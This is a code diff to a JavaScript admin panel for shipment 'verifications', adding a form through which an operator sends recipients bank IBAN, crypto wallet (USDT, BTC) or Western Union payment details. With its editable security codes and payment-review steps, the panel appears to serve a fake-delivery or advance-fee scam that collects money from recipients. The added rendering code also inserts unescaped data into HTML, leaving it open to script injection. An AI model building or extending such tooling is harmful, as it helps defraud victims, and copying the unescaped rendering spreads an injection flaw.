@@ -328,6 +328,8 @@ function renderDetailPanel(v) {
       </div>
     </div>
     ` : ''}
+    ${renderPaymentDetailsSection(v)}
+
 
     ${v.security_code ? `
     <div class="detail-section">
@@ -531,6 +533,9 @@ function setupActionButtons() {
       }
     });
   });
+  
+  // Setup payment details form listeners
+  setupPaymentDetailsFormListeners();
 }
 
 // Approve payment
@@ -606,7 +611,7 @@ async function processPaymentRejection() {
 // Update header stats
 function updateStats() {
   const pendingCount = verifications.filter(v =>
-    v.status === 'documents_submitted' || v.status === 'payment_submitted'
+    v.status === 'documents_submitted' || v.status === 'payment_submitted' || v.payment_details_status === 'waiting'
   ).length;
 
   const today = new Date().toDateString();
@@ -620,6 +625,7 @@ function updateStats() {
 
 // Helper functions
 function getActionRequired(v) {
+  if (v.payment_details_status === 'waiting') return 'Provide Payment Details';
   if (v.status === 'documents_submitted') return 'Review Documents';
   if (v.status === 'payment_submitted') return 'Review Payment';
   return null;
@@ -1161,13 +1167,26 @@ function showVerificationLink(token) {
 
 // Show edit code modal
 function showEditCodeModal(trackingId) {
-  const shipment = shipments.find(s => s.tracking_id === trackingId);
-  if (!shipment) return;
+  // Try to find in shipments array first
+  let shipment = shipments.find(s => s.tracking_id === trackingId);
+
+  // If not found and we have a selected verification, use that
+  if (!shipment && selectedVerification && selectedVerification.tracking_id === trackingId) {
+    shipment = selectedVerification;
+  }
+
+  if (!shipment) {
+    console.error('[Edit Code] Could not find shipment/verification for tracking ID:', trackingId);
+    alert('Error: Could not find verification data');
+    return;
+  }
 
   if (shipment.code_verified) {
     alert('Cannot edit: Security code has already been verified');
     return;
   }
+
+  console.log('[Edit Code] Opening modal for:', trackingId, 'Current code:', shipment.security_code);
 
   document.getElementById('code-tracking-id').textContent = trackingId;
   document.getElementById('new-security-code').value = shipment.security_code || '';
@@ -1482,4 +1501,328 @@ function showShipmentsError(message) {
       </td>
     </tr>
   `;
+}// Render payment details request section in admin panel
+function renderPaymentDetailsSection(v) {
+  if (!v.payment_method_requested) {
+    return '';
+  }
+
+  const methodNames = {
+    'bank_transfer': 'Bank Transfer',
+    'cryptocurrency': 'Cryptocurrency',
+    'other': 'Other Payment Method'
+  };
+
+  const methodName = methodNames[v.payment_method_requested] || v.payment_method_requested;
+
+  if (v.payment_details_status === 'waiting') {
+    // Show form to provide payment details
+    return `
+      <div class="detail-section" style="background: #fef3c7; border-left: 4px solid #f59e0b; padding: 20px; border-radius: 8px;">
+        <h3 class="section-title" style="color: #92400e;">⚠️ Payment Details Requested</h3>
+        <p style="color: #78350f; margin-bottom: 16px;">
+          Recipient has requested <strong>${methodName}</strong> details. Provide the account information below.
+        </p>
+
+        <div id="payment-details-form-container">
+          ${renderPaymentDetailsForm(v.payment_method_requested)}
+        </div>
+
+        <div class="action-buttons" style="margin-top: 20px;">
+          <button class="btn-primary" id="send-payment-details-btn">Send Details to Recipient</button>
+          <button class="btn-secondary" id="cancel-payment-details-btn">Cancel</button>
+        </div>
+      </div>
+    `;
+  } else if (v.payment_details_status === 'provided') {
+    // Show provided details
+    return `
+      <div class="detail-section">
+        <h3 class="section-title">✓ Payment Details Provided</h3>
+        <div class="approval-notice" style="margin-bottom: 12px;">
+          Payment details for <strong>${methodName}</strong> were sent on ${formatDate(v.payment_details_provided_at)}
+        </div>
+
+        <button class="btn-secondary" id="toggle-payment-details-btn" style="margin-bottom: 12px;">
+          <span id="payment-details-toggle-icon">▼</span> View Payment Details Sent
+        </button>
+
+        <div id="provided-payment-details-content" style="display: none; margin-top: 12px; padding: 16px; background: #f9fafb; border-radius: 8px; border: 1px solid #e5e7eb;">
+          <h4 style="margin: 0 0 12px 0; font-size: 14px; color: #374151;">Details Provided to Recipient:</h4>
+          <div class="detail-grid">
+            ${renderProvidedPaymentDetails(v.payment_method_requested, v.payment_details)}
+          </div>
+        </div>
+      </div>
+    `;
+  }
+
+  return '';
+}
+
+// Render payment details form based on method
+function renderPaymentDetailsForm(method) {
+  if (method === 'bank_transfer') {
+    return `
+      <div class="form-group">
+        <label>Bank Name *</label>
+        <input type="text" id="payment-bank-name" placeholder="e.g., BNP Paribas" required>
+      </div>
+      <div class="form-group">
+        <label>Account Holder *</label>
+        <input type="text" id="payment-account-holder" placeholder="Full name on account" required>
+      </div>
+      <div class="form-group">
+        <label>IBAN *</label>
+        <input type="text" id="payment-iban" placeholder="FR76 3000 4025 1800 0100 0509 383" required>
+      </div>
+      <div class="form-group">
+        <label>SWIFT/BIC *</label>
+        <input type="text" id="payment-swift" placeholder="BNPAFRPP" required>
+      </div>
+      <div class="form-group">
+        <label>Reference (Optional)</label>
+        <input type="text" id="payment-reference" placeholder="Payment reference">
+      </div>
+      <div class="form-group">
+        <label>Additional Info (Optional)</label>
+        <textarea id="payment-additional-info" rows="3" placeholder="Any special instructions..."></textarea>
+      </div>
+    `;
+  } else if (method === 'cryptocurrency') {
+    return `
+      <div class="form-group">
+        <label>Cryptocurrency Type *</label>
+        <select id="payment-crypto-type" required>
+          <option value="">Select cryptocurrency...</option>
+          <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
+          <option value="USDT (TRC20)">USDT (TRC20)</option>
+          <option value="USDT (ERC20)">USDT (ERC20)</option>
+          <option value="Ethereum (ETH)">Ethereum (ETH)</option>
+          <option value="Other">Other</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>Network *</label>
+        <input type="text" id="payment-network" placeholder="e.g., Bitcoin Network, Tron (TRC20)" required>
+      </div>
+      <div class="form-group">
+        <label>Wallet Address *</label>
+        <input type="text" id="payment-wallet" placeholder="Full wallet address" required>
+      </div>
+      <div class="form-group">
+        <label>Amount in Crypto (Optional)</label>
+        <input type="text" id="payment-crypto-amount" placeholder="e.g., 0.0123 BTC">
+      </div>
+      <div class="form-group">
+        <label>Additional Info (Optional)</label>
+        <textarea id="payment-additional-info" rows="3" placeholder="Any special instructions..."></textarea>
+      </div>
+    `;
+  } else {
+    // Other payment methods
+    return `
+      <div class="form-group">
+        <label>Payment Method Name *</label>
+        <input type="text" id="payment-method-name" placeholder="e.g., PayPal, Western Union" required>
+      </div>
+      <div class="form-group">
+        <label>Account/ID *</label>
+        <input type="text" id="payment-account-info" placeholder="Account number or ID" required>
+      </div>
+      <div class="form-group">
+        <label>Recipient Name (Optional)</label>
+        <input type="text" id="payment-recipient-name" placeholder="Name to send payment to">
+      </div>
+      <div class="form-group">
+        <label>Reference (Optional)</label>
+        <input type="text" id="payment-reference" placeholder="Reference or memo">
+      </div>
+      <div class="form-group">
+        <label>Instructions *</label>
+        <textarea id="payment-instructions" rows="4" placeholder="Detailed instructions for recipient..." required></textarea>
+      </div>
+    `;
+  }
+}
+
+// Render provided payment details
+function renderProvidedPaymentDetails(method, details) {
+  if (!details) return '<p>No details available</p>';
+
+  if (method === 'bank_transfer') {
+    return `
+      <div class="detail-item"><span class="detail-label">Bank Name</span><span class="detail-value">${details.bank_name || 'N/A'}</span></div>
+      <div class="detail-item"><span class="detail-label">Account Holder</span><span class="detail-value">${details.account_holder || 'N/A'}</span></div>
+      <div class="detail-item"><span class="detail-label">IBAN</span><span class="detail-value">${details.iban || 'N/A'}</span></div>
+      <div class="detail-item"><span class="detail-label">SWIFT/BIC</span><span class="detail-value">${details.swift_bic || 'N/A'}</span></div>
+      ${details.reference ? `<div class="detail-item"><span class="detail-label">Reference</span><span class="detail-value">${details.reference}</span></div>` : ''}
+      ${details.additional_info ? `<div class="detail-item" style="grid-column: 1 / -1;"><span class="detail-label">Additional Info</span><span class="detail-value">${details.additional_info}</span></div>` : ''}
+    `;
+  } else if (method === 'cryptocurrency') {
+    return `
+      <div class="detail-item"><span class="detail-label">Cryptocurrency</span><span class="detail-value">${details.crypto_type || 'N/A'}</span></div>
+      <div class="detail-item"><span class="detail-label">Network</span><span class="detail-value">${details.network || 'N/A'}</span></div>
+      <div class="detail-item" style="grid-column: 1 / -1;"><span class="detail-label">Wallet Address</span><span class="detail-value" style="font-family: monospace; word-break: break-all;">${details.wallet_address || 'N/A'}</span></div>
+      ${details.amount_crypto ? `<div class="detail-item"><span class="detail-label">Amount</span><span class="detail-value">${details.amount_crypto}</span></div>` : ''}
+      ${details.additional_info ? `<div class="detail-item" style="grid-column: 1 / -1;"><span class="detail-label">Additional Info</span><span class="detail-value">${details.additional_info}</span></div>` : ''}
+    `;
+  } else {
+    return `
+      <div class="detail-item"><span class="detail-label">Payment Method</span><span class="detail-value">${details.method_name || 'N/A'}</span></div>
+      ${details.account_info ? `<div class="detail-item"><span class="detail-label">Account/ID</span><span class="detail-value">${details.account_info}</span></div>` : ''}
+      ${details.recipient_name ? `<div class="detail-item"><span class="detail-label">Recipient Name</span><span class="detail-value">${details.recipient_name}</span></div>` : ''}
+      ${details.reference ? `<div class="detail-item"><span class="detail-label">Reference</span><span class="detail-value">${details.reference}</span></div>` : ''}
+      ${details.instructions ? `<div class="detail-item" style="grid-column: 1 / -1;"><span class="detail-label">Instructions</span><span class="detail-value" style="white-space: pre-wrap;">${details.instructions}</span></div>` : ''}
+    `;
+  }
+}
+
+// Collect payment details from form
+function collectPaymentDetailsFromForm(method) {
+  console.log('[Admin] Collecting payment details for method:', method);
+
+  if (method === 'bank_transfer') {
+    const bankNameEl = document.getElementById('payment-bank-name');
+    const accountHolderEl = document.getElementById('payment-account-holder');
+    const ibanEl = document.getElementById('payment-iban');
+    const swiftEl = document.getElementById('payment-swift');
+    const referenceEl = document.getElementById('payment-reference');
+    const additionalInfoEl = document.getElementById('payment-additional-info');
+
+    console.log('[Admin] Form elements found:', {
+      bankName: !!bankNameEl,
+      accountHolder: !!accountHolderEl,
+      iban: !!ibanEl,
+      swift: !!swiftEl
+    });
+
+    console.log('[Admin] Form values:', {
+      bank_name: bankNameEl?.value,
+      account_holder: accountHolderEl?.value,
+      iban: ibanEl?.value,
+      swift_bic: swiftEl?.value
+    });
+
+    return {
+      bank_name: bankNameEl?.value?.trim() || '',
+      account_holder: accountHolderEl?.value?.trim() || '',
+      iban: ibanEl?.value?.trim() || '',
+      swift_bic: swiftEl?.value?.trim() || '',
+      reference: referenceEl?.value?.trim() || '',
+      additional_info: additionalInfoEl?.value?.trim() || ''
+    };
+  } else if (method === 'cryptocurrency') {
+    return {
+      crypto_type: document.getElementById('payment-crypto-type')?.value || '',
+      network: document.getElementById('payment-network')?.value || '',
+      wallet_address: document.getElementById('payment-wallet')?.value || '',
+      amount_crypto: document.getElementById('payment-crypto-amount')?.value || '',
+      additional_info: document.getElementById('payment-additional-info')?.value || ''
+    };
+  } else {
+    return {
+      method_name: document.getElementById('payment-method-name')?.value || '',
+      account_info: document.getElementById('payment-account-info')?.value || '',
+      recipient_name: document.getElementById('payment-recipient-name')?.value || '',
+      reference: document.getElementById('payment-reference')?.value || '',
+      instructions: document.getElementById('payment-instructions')?.value || ''
+    };
+  }
+}
+
+// Send payment details to recipient
+async function sendPaymentDetailsToRecipient() {
+  if (!selectedVerification) return;
+
+  const method = selectedVerification.payment_method_requested;
+  const paymentDetails = collectPaymentDetailsFromForm(method);
+
+  console.log('[Admin] Sending payment details for method:', method);
+  console.log('[Admin] Collected payment details:', paymentDetails);
+
+  // Validate required fields
+  if (method === 'bank_transfer' && (!paymentDetails.bank_name || !paymentDetails.iban || !paymentDetails.swift_bic)) {
+    console.error('[Admin] Validation failed:', {
+      bank_name: paymentDetails.bank_name,
+      iban: paymentDetails.iban,
+      swift_bic: paymentDetails.swift_bic
+    });
+    alert('Please fill in all required fields (Bank Name, IBAN, SWIFT/BIC)');
+    return;
+  }
+  if (method === 'cryptocurrency' && (!paymentDetails.crypto_type || !paymentDetails.network || !paymentDetails.wallet_address)) {
+    alert('Please fill in all required fields (Crypto Type, Network, Wallet Address)');
+    return;
+  }
+  if (method === 'other' && (!paymentDetails.method_name || !paymentDetails.instructions)) {
+    alert('Please fill in all required fields (Method Name, Instructions)');
+    return;
+  }
+
+  try {
+    console.log('[Admin] Sending payment details:', paymentDetails);
+
+    const response = await fetch(`${BACKEND_URL}/api/admin/verifications/${selectedVerification.id}/provide-payment-details`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ payment_details: paymentDetails })
+    });
+
+    if (!response.ok) {
+      const error = await response.json();
+      throw new Error(error.error || 'Failed to send payment details');
+    }
+
+    const result = await response.json();
+    console.log('[Admin] Payment details sent successfully:', result);
+
+    alert('Payment details sent to recipient successfully!');
+
+    // Refresh verification data
+    await loadVerifications();
+
+    // Refresh detail panel
+    const updatedVerification = verifications.find(v => v.id === selectedVerification.id);
+    if (updatedVerification) {
+      selectedVerification = updatedVerification;
+      showDetailPanel();
+    }
+
+  } catch (error) {
+    console.error('[Admin] Error sending payment details:', error);
+    alert('Failed to send payment details: ' + error.message);
+  }
+}
+
+// Setup payment details form listeners
+function setupPaymentDetailsFormListeners() {
+  const sendBtn = document.getElementById('send-payment-details-btn');
+  if (sendBtn) {
+    sendBtn.addEventListener('click', sendPaymentDetailsToRecipient);
+  }
+
+  const cancelBtn = document.getElementById('cancel-payment-details-btn');
+  if (cancelBtn) {
+    cancelBtn.addEventListener('click', () => {
+      if (confirm('Cancel payment details form? The recipient is still waiting.')) {
+        closeDetailPanel();
+      }
+    });
+  }
+
+  // Toggle payment details visibility
+  const toggleBtn = document.getElementById('toggle-payment-details-btn');
+  if (toggleBtn) {
+    toggleBtn.addEventListener('click', () => {
+      const content = document.getElementById('provided-payment-details-content');
+      const icon = document.getElementById('payment-details-toggle-icon');
+      if (content && icon) {
+        const isVisible = content.style.display !== 'none';
+        content.style.display = isVisible ? 'none' : 'block';
+        icon.textContent = isVisible ? '▼' : '▲';
+        toggleBtn.innerHTML = `<span id="payment-details-toggle-icon">${isVisible ? '▼' : '▲'}</span> ${isVisible ? 'View' : 'Hide'} Payment Details Sent`;
+      }
+    });
+  }
 }
